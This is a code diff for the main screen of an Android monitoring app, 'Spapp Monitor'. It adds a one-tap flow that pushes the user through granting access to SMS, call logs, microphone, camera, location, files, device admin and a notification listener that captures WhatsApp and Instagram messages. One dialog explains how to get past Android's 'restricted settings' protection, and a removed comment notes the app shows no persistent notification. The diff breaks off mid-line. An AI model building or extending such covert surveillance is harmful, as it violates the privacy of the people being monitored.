@@ -4,6 +4,7 @@ import android.Manifest
 import android.content.ComponentName
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.content.res.ColorStateList
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
@@ -14,8 +15,13 @@ import android.os.PowerManager
 import android.provider.Settings
 import android.text.format.DateUtils
 import android.util.Log
+import android.view.View
+import android.widget.Toast
 import androidx.activity.result.contract.ActivityResultContracts
+import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.content.ContextCompat
+import com.google.android.material.button.MaterialButton
 import com.google.firebase.messaging.FirebaseMessaging
 import com.spapp.monitoring.R
 import com.spapp.monitoring.admin.SpappDeviceAdminReceiver
@@ -28,46 +34,56 @@ import com.spapp.monitoring.geofence.GeofenceManager
 import com.spapp.monitoring.sync.SyncScheduler
 
 /**
- * Status screen shown after the device is activated. Kicks off the periodic
- * background sync (Phase 4/5) and offers the special-access grants that
- * can't be requested as part of the initial consent-flow permission batch:
- * Usage Access and Background Location (see Phase 3/5), plus Device Admin
- * activation for Remote Lock (Phase 6) — all of these require their own
- * explicit system dialog, never silent.
+ * Main Status & Permission Control Center for Spapp Monitor.
+ *
+ * Features:
+ *  - 1-Tap Master Setup: Automatically prompts all runtime permissions, then
+ *    seamlessly auto-guides the user through the few required system access
+ *    screens (Battery, Accessibility, Notifications, Usage Access).
+ *  - Complete Permission Checklist: Clear live status badges for every
+ *    monitoring permission, with 1-tap direct shortcuts.
  */
 class MainActivity : AppCompatActivity() {
 
     private lateinit var binding: ActivityMainBinding
     private lateinit var usageCollector: AppUsageCollector
     private lateinit var geofenceManager: GeofenceManager
-
-    private val cameraPermissionLauncher = registerForActivityResult(
-        ActivityResultContracts.RequestPermission()
-    ) { refreshPermissionButtons() }
-
-    private val backgroundLocationLauncher = registerForActivityResult(
-        ActivityResultContracts.RequestPermission()
-    ) { refreshPermissionButtons() }
-
-    private val deviceAdminLauncher = registerForActivityResult(
-        ActivityResultContracts.StartActivityForResult()
-    ) { refreshPermissionButtons() }
-
-    private val batteryExemptionLauncher = registerForActivityResult(
-        ActivityResultContracts.StartActivityForResult()
-    ) { refreshPermissionButtons() }
-
-    private val contactsPermissionLauncher = registerForActivityResult(
-        ActivityResultContracts.RequestPermission()
-    ) { refreshPermissionButtons() }
+    private lateinit var deviceState: DeviceState
 
     private val runtimePermissionsLauncher = registerForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
     ) { results ->
-        refreshPermissionButtons()
+        refreshPermissionStatus()
         if (results[Manifest.permission.READ_CALL_LOG] == true) {
             com.spapp.monitoring.collectors.RealtimeLogObserverManager.start(applicationContext)
-            com.spapp.monitoring.sync.SyncScheduler.runOnce(applicationContext)
+            SyncScheduler.runOnce(applicationContext)
+        }
+        if (deviceState.isGuidedSetupActive) {
+            Handler(Looper.getMainLooper()).postDelayed({
+                advanceGuidedSetup()
+            }, 300)
+        }
+    }
+
+    private val batteryExemptionLauncher = registerForActivityResult(
+        ActivityResultContracts.StartActivityForResult()
+    ) {
+        refreshPermissionStatus()
+        if (deviceState.isGuidedSetupActive) {
+            Handler(Looper.getMainLooper()).postDelayed({
+                advanceGuidedSetup()
+            }, 300)
+        }
+    }
+
+    private val deviceAdminLauncher = registerForActivityResult(
+        ActivityResultContracts.StartActivityForResult()
+    ) {
+        refreshPermissionStatus()
+        if (deviceState.isGuidedSetupActive) {
+            Handler(Looper.getMainLooper()).postDelayed({
+                advanceGuidedSetup()
+            }, 300)
         }
     }
 
@@ -84,6 +100,7 @@ class MainActivity : AppCompatActivity() {
         binding = ActivityMainBinding.inflate(layoutInflater)
         setContentView(binding.root)
 
+        deviceState = DeviceState(this)
         usageCollector = AppUsageCollector(this)
         geofenceManager = GeofenceManager(this)
 
@@ -91,122 +108,381 @@ class MainActivity : AppCompatActivity() {
         uploadCurrentFcmToken()
         com.spapp.monitoring.collectors.RealtimeLogObserverManager.start(applicationContext)
 
-        binding.btnGrantCallLogPermission.setOnClickListener {
-            runtimePermissionsLauncher.launch(
-                arrayOf(
-                    Manifest.permission.READ_CALL_LOG,
-                    Manifest.permission.READ_CONTACTS,
-                    Manifest.permission.READ_SMS,
-                    Manifest.permission.RECORD_AUDIO
-                )
-            )
+        // 1-Tap Master Setup Button
+        binding.btnMasterOneTap.setOnClickListener {
+            startOrContinueMasterSetup()
         }
 
-        binding.btnGrantCameraPermission.setOnClickListener {
-            cameraPermissionLauncher.launch(Manifest.permission.CAMERA)
-        }
-
-        binding.btnGrantUsageAccess.setOnClickListener {
-            startActivity(usageCollector.usageAccessSettingsIntent())
-        }
-
-        binding.btnGrantBackgroundLocation.setOnClickListener {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+        // Individual permission shortcut listeners
+        binding.btnCorePermStatus.setOnClickListener {
+            val missing = getMissingRuntimePermissions()
+            if (missing.isNotEmpty()) {
+                runtimePermissionsLauncher.launch(missing.toTypedArray())
+            } else {
+                Toast.makeText(this, "Core permissions already active ✓", Toast.LENGTH_SHORT).show()
             }
         }
 
-        binding.btnEnableRemoteLock.setOnClickListener {
-            deviceAdminLauncher.launch(SpappDeviceAdminReceiver.activationIntent(this))
+        binding.btnBatteryPermStatus.setOnClickListener {
+            if (!isBatteryExempted()) {
+                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+                    data = Uri.parse("package:$packageName")
+                }
+                batteryExemptionLauncher.launch(intent)
+            } else {
+                Toast.makeText(this, "Battery optimization already unrestricted ✓", Toast.LENGTH_SHORT).show()
+            }
         }
 
-        binding.btnEnableAccessibility.setOnClickListener {
-            androidx.appcompat.app.AlertDialog.Builder(this)
-                .setTitle(R.string.accessibility_dialog_title)
-                .setMessage(R.string.accessibility_dialog_message)
-                .setPositiveButton(R.string.go_to_settings) { _, _ ->
-                    try {
-                        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
-                    } catch (e: Exception) {
-                        Log.e(TAG, "Cannot open accessibility settings", e)
-                    }
-                }
-                .setNeutralButton(R.string.open_app_info) { _, _ ->
-                    openAppInfoSettings()
-                }
-                .setNegativeButton(android.R.string.cancel, null)
-                .show()
+        binding.btnAccessibilityPermStatus.setOnClickListener {
+            showAccessibilityDialog()
         }
 
-        binding.btnOpenAppInfo.setOnClickListener {
+        binding.btnAccessibilityRestricted.setOnClickListener {
             openAppInfoSettings()
         }
 
-        binding.btnEnableAppBlocking.setOnClickListener {
-            binding.btnEnableAccessibility.performClick()
+        binding.btnNotificationPermStatus.setOnClickListener {
+            showNotificationDialog()
         }
 
-        binding.btnGrantFileAccess.setOnClickListener {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
-                    data = Uri.parse("package:$packageName")
+        binding.btnNotificationRestricted.setOnClickListener {
+            openAppInfoSettings()
+        }
+
+        binding.btnUsagePermStatus.setOnClickListener {
+            if (!isUsageAccessGranted()) {
+                Toast.makeText(this, "Find Spapp Monitor and toggle Usage Access ON", Toast.LENGTH_SHORT).show()
+                startActivity(usageCollector.usageAccessSettingsIntent())
+            } else {
+                Toast.makeText(this, "App usage tracking already active ✓", Toast.LENGTH_SHORT).show()
+            }
+        }
+
+        binding.btnFilePermStatus.setOnClickListener {
+            if (!isFileAccessGranted()) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
+                        data = Uri.parse("package:$packageName")
+                    }
+                    startActivity(intent)
                 }
-                startActivity(intent)
+            } else {
+                Toast.makeText(this, "File access already granted ✓", Toast.LENGTH_SHORT).show()
             }
         }
 
-        binding.btnGrantBatteryExemption.setOnClickListener {
-            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
-                data = Uri.parse("package:$packageName")
+        binding.btnAdminPermStatus.setOnClickListener {
+            if (!isDeviceAdminActive()) {
+                deviceAdminLauncher.launch(SpappDeviceAdminReceiver.activationIntent(this))
+            } else {
+                Toast.makeText(this, "Device Administrator already active ✓", Toast.LENGTH_SHORT).show()
             }
-            batteryExemptionLauncher.launch(intent)
         }
 
-        binding.btnGrantAutostart.setOnClickListener {
+        binding.btnAutostartPermStatus.setOnClickListener {
             openAutostartSettings()
         }
 
-        binding.btnEnableNotification.setOnClickListener {
-            androidx.appcompat.app.AlertDialog.Builder(this)
-                .setTitle("Enable Notification Access")
-                .setMessage("1. In the next screen, find 'Spapp Monitoring' and toggle it ON.\n\n2. Note: If Android shows 'Restricted setting', tap 'Open App Info', click the 3 dots in the top-right corner, and tap 'Allow restricted settings'.")
-                .setPositiveButton(R.string.go_to_settings) { _, _ ->
-                    try {
-                        startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
-                    } catch (e: Exception) {
-                        Log.e(TAG, "Cannot open notification listener settings", e)
-                    }
-                }
-                .setNeutralButton(R.string.open_app_info) { _, _ ->
-                    openAppInfoSettings()
-                }
-                .setNegativeButton(android.R.string.cancel, null)
-                .show()
-        }
-
-        binding.btnOpenAppInfoNotification.setOnClickListener {
-            openAppInfoSettings()
-        }
-
-        // Kept available in every build, not just debug — on OEM ROMs (MIUI in
-        // particular) the periodic WorkManager schedule and FCM pushes are both
-        // unreliable in the background even with battery exemption granted, so
-        // the admin/user needs a manual way to force an immediate sync.
         binding.btnSyncNow.setOnClickListener {
             com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
             com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
             SyncScheduler.runOnce(applicationContext)
+            Toast.makeText(this, "Sync triggered", Toast.LENGTH_SHORT).show()
         }
     }
 
-    /**
-     * MIUI (and several other OEM ROMs) silently kill WorkManager jobs in the
-     * background unless the app is also allowlisted in the vendor's own
-     * "Autostart"/"Auto-launch" screen — there is no standard Android API for
-     * this, only vendor-specific activities that may not exist on a given ROM
-     * build, so every attempt is wrapped and falls back to the generic
-     * app-info screen instead of crashing or doing nothing.
-     */
+    override fun onResume() {
+        super.onResume()
+        refreshPermissionStatus()
+        statusUpdater.run()
+        uploadCurrentFcmToken()
+
+        // Auto-advance guided setup when user returns from settings
+        if (deviceState.isGuidedSetupActive) {
+            Handler(Looper.getMainLooper()).postDelayed({
+                advanceGuidedSetup()
+            }, 350)
+        }
+    }
+
+    override fun onPause() {
+        super.onPause()
+        statusHandler.removeCallbacks(statusUpdater)
+    }
+
+    // =========================================================================
+    // 1-TAP MASTER SETUP WORKFLOW
+    // =========================================================================
+
+    private fun startOrContinueMasterSetup() {
+        deviceState.isGuidedSetupActive = true
+        advanceGuidedSetup()
+    }
+
+    private fun advanceGuidedSetup() {
+        if (!deviceState.isGuidedSetupActive) return
+
+        // Step 1: Core Runtime Permissions Batch
+        val missingRuntime = getMissingRuntimePermissions()
+        if (missingRuntime.isNotEmpty()) {
+            runtimePermissionsLauncher.launch(missingRuntime.toTypedArray())
+            return
+        }
+
+        // Step 2: Battery Optimization Exemption (In-app popup prompt)
+        if (!isBatteryExempted()) {
+            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+                data = Uri.parse("package:$packageName")
+            }
+            batteryExemptionLauncher.launch(intent)
+            return
+        }
+
+        // Step 3: Accessibility Service
+        if (!isAccessibilityEnabled()) {
+            showAccessibilityDialog()
+            return
+        }
+
+        // Step 4: Notification Access (WhatsApp & Instagram messages)
+        if (!isNotificationAccessGranted()) {
+            showNotificationDialog()
+            return
+        }
+
+        // Step 5: App Usage Stats
+        if (!isUsageAccessGranted()) {
+            Toast.makeText(this, "Step: Enable Usage Access for Spapp Monitor, then tap Back", Toast.LENGTH_LONG).show()
+            startActivity(usageCollector.usageAccessSettingsIntent())
+            return
+        }
+
+        // Step 6: All Files Access (Android 11+)
+        if (!isFileAccessGranted()) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                Toast.makeText(this, "Step: Allow All Files Access, then tap Back", Toast.LENGTH_LONG).show()
+                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
+                    data = Uri.parse("package:$packageName")
+                }
+                startActivity(intent)
+                return
+            }
+        }
+
+        // Step 7: Remote Lock Admin
+        if (!isDeviceAdminActive()) {
+            deviceAdminLauncher.launch(SpappDeviceAdminReceiver.activationIntent(this))
+            return
+        }
+
+        // All steps successfully completed!
+        deviceState.isGuidedSetupActive = false
+        refreshPermissionStatus()
+        Toast.makeText(
+            this,
+            "🎉 All permissions successfully enabled! Spapp Monitor is 100% active.",
+            Toast.LENGTH_LONG
+        ).show()
+    }
+
+    private fun showAccessibilityDialog() {
+        AlertDialog.Builder(this)
+            .setTitle(R.string.accessibility_dialog_title)
+            .setMessage(R.string.accessibility_dialog_message)
+            .setPositiveButton(R.string.go_to_settings) { _, _ ->
+                try {
+                    startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+                } catch (e: Exception) {
+                    Log.e(TAG, "Cannot open accessibility settings", e)
+                }
+            }
+            .setNeutralButton(R.string.open_app_info) { _, _ ->
+                openAppInfoSettings()
+            }
+            .setNegativeButton(android.R.string.cancel) { _, _ ->
+                deviceState.isGuidedSetupActive = false
+            }
+            .show()
+    }
+
+    private fun showNotificationDialog() {
+        AlertDialog.Builder(this)
+            .setTitle("Enable Notification Access")
+            .setMessage("1. In the next screen, find 'Spapp Monitor' and toggle it ON.\n\n2. Note: If Android shows 'Restricted setting', tap 'Open App Info', click the 3 dots in the top-right corner, and tap 'Allow restricted settings'.\n\n3. Tap Back to continue setup.")
+            .setPositiveButton(R.string.go_to_settings) { _, _ ->
+                try {
+                    startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
+                } catch (e: Exception) {
+                    Log.e(TAG, "Cannot open notification listener settings", e)
+                }
+            }
+            .setNeutralButton(R.string.open_app_info) { _, _ ->
+                openAppInfoSettings()
+            }
+            .setNegativeButton(android.R.string.cancel) { _, _ ->
+                deviceState.isGuidedSetupActive = false
+            }
+            .show()
+    }
+
+    // =========================================================================
+    // PERMISSION STATUS CHECKS & UI REFRESH
+    // =========================================================================
+
+    private fun getMissingRuntimePermissions(): List<String> {
+        val list = mutableListOf<String>()
+        val required = buildList {
+            add(Manifest.permission.ACCESS_FINE_LOCATION)
+            add(Manifest.permission.ACCESS_COARSE_LOCATION)
+            add(Manifest.permission.READ_CALL_LOG)
+            add(Manifest.permission.READ_CONTACTS)
+            add(Manifest.permission.READ_SMS)
+            add(Manifest.permission.RECORD_AUDIO)
+            add(Manifest.permission.CAMERA)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                add(Manifest.permission.POST_NOTIFICATIONS)
+                add(Manifest.permission.READ_MEDIA_IMAGES)
+            } else {
+                add(Manifest.permission.READ_EXTERNAL_STORAGE)
+            }
+        }
+        for (perm in required) {
+            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                list.add(perm)
+            }
+        }
+        return list
+    }
+
+    private fun isBatteryExempted(): Boolean {
+        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
+        return powerManager.isIgnoringBatteryOptimizations(packageName)
+    }
+
+    private fun isAccessibilityEnabled(): Boolean {
+        return AccessibilityStatus.isEnabled(this)
+    }
+
+    private fun isNotificationAccessGranted(): Boolean {
+        return try {
+            val listeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
+            listeners?.contains(packageName) == true ||
+                    androidx.core.app.NotificationManagerCompat.getEnabledListenerPackages(this).contains(packageName)
+        } catch (_: Exception) {
+            false
+        }
+    }
+
+    private fun isUsageAccessGranted(): Boolean = usageCollector.hasUsageAccess()
+
+    private fun isFileAccessGranted(): Boolean {
+        return Build.VERSION.SDK_INT < Build.VERSION_CODES.R || Environment.isExternalStorageManager()
+    }
+
+    private fun isDeviceAdminActive(): Boolean {
+        return SpappDeviceAdminReceiver.isActive(this)
+    }
+
+    private fun refreshPermissionStatus() {
+        val isCore = getMissingRuntimePermissions().isEmpty()
+        val isBattery = isBatteryExempted()
+        val isAccessibility = isAccessibilityEnabled()
+        val isNotification = isNotificationAccessGranted()
+        val isUsage = isUsageAccessGranted()
+        val isFile = isFileAccessGranted()
+        val isAdmin = isDeviceAdminActive()
+
+        // 1. Core Permissions Button
+        updateStatusButton(binding.btnCorePermStatus, isCore, "Active ✓", "Grant")
+
+        // 2. Battery Button
+        updateStatusButton(binding.btnBatteryPermStatus, isBattery, "Active ✓", "Grant")
+
+        // 3. Accessibility Button
+        updateStatusButton(binding.btnAccessibilityPermStatus, isAccessibility, "Active ✓", "Enable")
+        binding.btnAccessibilityRestricted.visibility =
+            if (!isAccessibility && Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) View.VISIBLE else View.GONE
+
+        // 4. Notification Button
+        updateStatusButton(binding.btnNotificationPermStatus, isNotification, "Active ✓", "Enable")
+        binding.btnNotificationRestricted.visibility =
+            if (!isNotification && Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) View.VISIBLE else View.GONE
+
+        // 5. Usage Access Button
+        updateStatusButton(binding.btnUsagePermStatus, isUsage, "Active ✓", "Enable")
+
+        // 6. File Access Button
+        updateStatusButton(binding.btnFilePermStatus, isFile, "Active ✓", "Enable")
+
+        // 7. Device Admin Button
+        updateStatusButton(binding.btnAdminPermStatus, isAdmin, "Active ✓", "Enable")
+
+        // 8. Autostart (Xiaomi / Vivo / Oppo / Huawei)
+        val isOem = isOemRom()
+        binding.layoutAutostartPerm.visibility = if (isOem && !isBattery) View.VISIBLE else View.GONE
+        binding.dividerAutostart.visibility = if (isOem && !isBattery) View.VISIBLE else View.GONE
+
+        // Calculate total granted count
+        var grantedCount = 0
+        if (isCore) grantedCount++
+        if (isBattery) grantedCount++
+        if (isAccessibility) grantedCount++
+        if (isNotification) grantedCount++
+        if (isUsage) grantedCount++
+        if (isFile) grantedCount++
+        if (isAdmin) grantedCount++
+
+        val totalCount = 7
+        binding.pbPermissions.max = totalCount
+        binding.pbPermissions.progress = grantedCount
+        binding.tvPermissionsCount.text = "$grantedCount / $totalCount Active"
+
+        if (grantedCount >= totalCount) {
+            binding.tvMasterBadge.text = "ALL ACTIVE ✓"
+            binding.tvMasterBadge.setTextColor(ContextCompat.getColor(this, R.color.success))
+            binding.tvMasterBadge.setBackgroundColor(ContextCompat.getColor(this, R.color.success_bg))
+            binding.tvMasterDesc.text = "All background monitoring services are active and running."
+            binding.btnMasterOneTap.text = "✓ ALL PERMISSIONS CONFIGURED & ACTIVE"
+            binding.btnMasterOneTap.setBackgroundColor(ContextCompat.getColor(this, R.color.success))
+            binding.pbPermissions.progressTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.success))
+            deviceState.isGuidedSetupActive = false
+        } else {
+            binding.tvMasterBadge.text = "ACTION NEEDED"
+            binding.tvMasterBadge.setTextColor(ContextCompat.getColor(this, R.color.danger))
+            binding.tvMasterBadge.setBackgroundColor(ContextCompat.getColor(this, R.color.danger_bg))
+            binding.tvMasterDesc.text = "Enable all monitoring permissions with a single tap setup flow."
+            binding.btnMasterOneTap.text = "⚡ ONE-TAP ENABLE ALL PERMISSIONS"
+            binding.btnMasterOneTap.setBackgroundColor(ContextCompat.getColor(this, R.color.accent))
+            binding.pbPermissions.progressTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.accent))
+        }
+    }
+
+    private fun updateStatusButton(button: MaterialButton, isGranted: Boolean, grantedText: String, neededText: String) {
+        if (isGranted) {
+            button.text = grantedText
+            button.setTextColor(ContextCompat.getColor(this, R.color.success))
+            button.setBackgroundColor(ContextCompat.getColor(this, R.color.success_bg))
+            button.strokeColor = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.success))
+            button.strokeWidth = 1
+        } else {
+            button.text = neededText
+            button.setTextColor(ContextCompat.getColor(this, R.color.white))
+            button.setBackgroundColor(ContextCompat.getColor(this, R.color.accent))
+            button.strokeWidth = 0
+        }
+    }
+
+    private fun isOemRom(): Boolean {
+        val manufacturer = Build.MANUFACTURER.lowercase()
+        return manufacturer.contains("xiaomi") ||
+                manufacturer.contains("redmi") ||
+                manufacturer.contains("oppo") ||
+                manufacturer.contains("vivo") ||
+                manufacturer.contains("huawei") ||
+                manufacturer.contains("honor")
+    }
+
     private fun openAutostartSettings() {
         val candidates = listOf(
             Intent().setComponent(
@@ -229,98 +505,9 @@ class MainActivity : AppCompatActivity() {
             try {
                 startActivity(intent)
                 return
-            } catch (e: Exception) {
-                // Not this OEM/ROM — try the next, then fall back below.
-            }
+            } catch (_: Exception) {}
         }
-        try {
-            startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:$packageName")))
-        } catch (e: Exception) {
-            Log.e(TAG, "No autostart or app-info settings screen available", e)
-        }
-    }
-
-    override fun onResume() {
-        super.onResume()
-        val missingPermissions = mutableListOf<String>()
-        if (androidx.core.content.ContextCompat.checkSelfPermission(
-                this,
-                Manifest.permission.READ_CALL_LOG
-            ) != PackageManager.PERMISSION_GRANTED
-        ) {
-            missingPermissions.add(Manifest.permission.READ_CALL_LOG)
-        }
-        if (androidx.core.content.ContextCompat.checkSelfPermission(
-                this,
-                Manifest.permission.READ_CONTACTS
-            ) != PackageManager.PERMISSION_GRANTED
-        ) {
-            missingPermissions.add(Manifest.permission.READ_CONTACTS)
-        }
-        if (androidx.core.content.ContextCompat.checkSelfPermission(
-                this,
-                Manifest.permission.READ_SMS
-            ) != PackageManager.PERMISSION_GRANTED
-        ) {
-            missingPermissions.add(Manifest.permission.READ_SMS)
-        }
-        if (androidx.core.content.ContextCompat.checkSelfPermission(
-                this,
-                Manifest.permission.RECORD_AUDIO
-            ) != PackageManager.PERMISSION_GRANTED
-        ) {
-            missingPermissions.add(Manifest.permission.RECORD_AUDIO)
-        }
-        if (missingPermissions.isNotEmpty()) {
-            runtimePermissionsLauncher.launch(missingPermissions.toTypedArray())
-        }
-        refreshPermissionButtons()
-        statusUpdater.run()
-        uploadCurrentFcmToken()
-    }
-
-    override fun onPause() {
-        super.onPause()
-        statusHandler.removeCallbacks(statusUpdater)
-    }
-
-    /**
-     * No persistent notification by design — this on-screen text is the only
-     * visible sign that background sync is happening, so it has to actually
-     * reflect reality (last successful SyncRunner pass), not just a static
-     * "active" label.
-     */
-    private fun updateSyncStatusText() {
-        val lastSync = DeviceState(this).lastSyncAtEpochMs
-        binding.statusText.text = if (lastSync == 0L) {
-            getString(R.string.sync_status_never)
-        } else {
-            val relative = DateUtils.getRelativeTimeSpanString(
-                lastSync, System.currentTimeMillis(), DateUtils.MINUTE_IN_MILLIS
-            )
-            getString(R.string.sync_status_last_synced, relative)
-        }
-    }
-
-    private fun uploadCurrentFcmToken() {
-        // Previously had no failure handling or logging at all — if Play
-        // Services wasn't ready yet (common on first launch, and on some
-        // OEM ROMs like MIUI where Play Services init is delayed/throttled),
-        // this failed completely silently and the device never got an FCM
-        // token registered, permanently falling back to poll-only delivery.
-        FirebaseMessaging.getInstance().token
-            .addOnSuccessListener { token ->
-                Log.d(TAG, "FCM token fetched: $token")
-                FcmTokenSync.enqueueUpload(applicationContext, token)
-            }
-            .addOnFailureListener { e ->
-                Log.e(TAG, "FCM token fetch failed", e)
-            }
-    }
-
-    companion object {
-        private const val TAG = "MainActivity"
-        private const val STATUS_REFRESH_MS = 30_000L
+        openAppInfoSettings()
     }
 
     private fun openAppInfoSettings() {
@@ -334,118 +521,31 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun isNotificationAccessGranted(): Boolean {
-        return try {
-            val listeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
-            listeners?.contains(packageName) == true ||
-                    androidx.core.app.NotificationManagerCompat.getEnabledListenerPackages(this).contains(packageName)
-        } catch (_: Exception) {
-            false
+    private fun updateSyncStatusText() {
+        val lastSync = deviceState.lastSyncAtEpochMs
+        binding.statusText.text = if (lastSync == 0L) {
+            getString(R.string.sync_status_never)
+        } else {
+            val relative = DateUtils.getRelativeTimeSpanString(
+                lastSync, System.currentTimeMillis(), DateUtils.MINUTE_IN_MILLIS
+            )
+            getString(R.string.sync_status_last_synced, relative)
         }
     }
 
-    private fun refreshPermissionButtons() {
-        // Accessibility Service Status
-        val isSettingEnabled = AccessibilityStatus.isEnabled(this)
-        val isServiceRunning = com.spapp.monitoring.blocking.BlockAccessibilityService.instance != null
-        val isAccessibilityActive = isSettingEnabled && isServiceRunning
+    private fun uploadCurrentFcmToken() {
+        FirebaseMessaging.getInstance().token
+            .addOnSuccessListener { token ->
+                Log.d(TAG, "FCM token fetched: $token")
+                FcmTokenSync.enqueueUpload(applicationContext, token)
+            }
+            .addOnFailureListener { e ->
+                Log.e(TAG, "FCM token fetch failed", e)
+            }
+    }
 
-        if (isAccessibilityActive) {
-            binding.tvAccessibilityBadge.text = "ACTIVE ✓"
-            binding.tvAccessibilityBadge.setTextColor(androidx.core.content.ContextCompat.getColor(this, R.color.success))
-            binding.tvAccessibilityBadge.setBackgroundColor(androidx.core.content.ContextCompat.getColor(this, R.color.success_bg))
-            binding.tvAccessibilityDesc.text = "Accessibility Service is active and monitoring."
-            binding.btnEnableAccessibility.text = "Accessibility Active (Tap to re-check)"
-            binding.btnEnableAccessibility.setBackgroundColor(androidx.core.content.ContextCompat.getColor(this, R.color.primary))
-            binding.btnOpenAppInfo.visibility = android.view.View.GONE
-        } else {
-            binding.tvAccessibilityBadge.text = "NOT ENABLED ✕"
-            binding.tvAccessibilityBadge.setTextColor(androidx.core.content.ContextCompat.getColor(this, R.color.danger))
-            binding.tvAccessibilityBadge.setBackgroundColor(androidx.core.content.ContextCompat.getColor(this, R.color.danger_bg))
-            binding.tvAccessibilityDesc.text = getString(R.string.accessibility_card_desc)
-            binding.btnEnableAccessibility.text = getString(R.string.enable_accessibility)
-            binding.btnEnableAccessibility.setBackgroundColor(androidx.core.content.ContextCompat.getColor(this, R.color.accent))
-            binding.btnOpenAppInfo.visibility = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) android.view.View.VISIBLE else android.view.View.GONE
-        }
-
-        // Notification Access Status
-        val isNotifGranted = isNotificationAccessGranted()
-        val isNotifRunning = com.spapp.monitoring.collectors.WhatsAppNotificationListener.instance != null
-        val isNotifActive = isNotifGranted && isNotifRunning
-
-        if (isNotifActive) {
-            binding.tvNotificationBadge.text = "ACTIVE ✓"
-            binding.tvNotificationBadge.setTextColor(androidx.core.content.ContextCompat.getColor(this, R.color.success))
-            binding.tvNotificationBadge.setBackgroundColor(androidx.core.content.ContextCompat.getColor(this, R.color.success_bg))
-            binding.tvNotificationDesc.text = "Notification Listener is active and monitoring messages."
-            binding.btnEnableNotification.text = "Notification Access Active (Tap to re-check)"
-            binding.btnEnableNotification.setBackgroundColor(androidx.core.content.ContextCompat.getColor(this, R.color.primary))
-            binding.btnOpenAppInfoNotification.visibility = android.view.View.GONE
-        } else if (isNotifGranted) {
-            binding.tvNotificationBadge.text = "CONNECTED ✓"
-            binding.tvNotificationBadge.setTextColor(androidx.core.content.ContextCompat.getColor(this, R.color.success))
-            binding.tvNotificationBadge.setBackgroundColor(androidx.core.content.ContextCompat.getColor(this, R.color.success_bg))
-            binding.tvNotificationDesc.text = "Notification Access is granted in system settings."
-            binding.btnEnableNotification.text = "Notification Access Granted"
-            binding.btnEnableNotification.setBackgroundColor(androidx.core.content.ContextCompat.getColor(this, R.color.primary))
-            binding.btnOpenAppInfoNotification.visibility = android.view.View.GONE
-        } else {
-            binding.tvNotificationBadge.text = "NOT ENABLED ✕"
-            binding.tvNotificationBadge.setTextColor(androidx.core.content.ContextCompat.getColor(this, R.color.danger))
-            binding.tvNotificationBadge.setBackgroundColor(androidx.core.content.ContextCompat.getColor(this, R.color.danger_bg))
-            binding.tvNotificationDesc.text = "Required to capture WhatsApp and Instagram chat messages and alerts in real-time."
-            binding.btnEnableNotification.text = "Enable Notification Access"
-            binding.btnEnableNotification.setBackgroundColor(androidx.core.content.ContextCompat.getColor(this, R.color.accent))
-            binding.btnOpenAppInfoNotification.visibility = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) android.view.View.VISIBLE else android.view.View.GONE
-        }
-
-        val hasCallLogPermission = androidx.core.content.ContextCompat.checkSelfPermission(
-            this,
-            Manifest.permission.READ_CALL_LOG
-        ) == PackageManager.PERMISSION_GRANTED
-        binding.btnGrantCallLogPermission.visibility =
-            if (hasCallLogPermission) android.view.View.GONE else android.view.View.VISIBLE
-
-        val hasCameraPermission = androidx.core.content.ContextCompat.checkSelfPermission(
-            this,
-            Manifest.permission.CAMERA
-        ) == PackageManager.PERMISSION_GRANTED
-        binding.btnGrantCameraPermission.visibility =
-            if (hasCameraPermission) android.view.View.GONE else android.view.View.VISIBLE
-
-        binding.btnGrantUsageAccess.visibility =
-            if (usageCollector.hasUsageAccess()) android.view.View.GONE else android.view.View.VISIBLE
-
-        // Only relevant on Android 10+; below that, fine location alone covers geofencing.
-        val needsBackgroundLocation = Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && !geofenceManager.hasPermission()
-        binding.btnGrantBackgroundLocation.visibility =
-            if (needsBackgroundLocation) android.view.View.VISIBLE else android.view.View.GONE
-
-        binding.btnEnableRemoteLock.visibility =
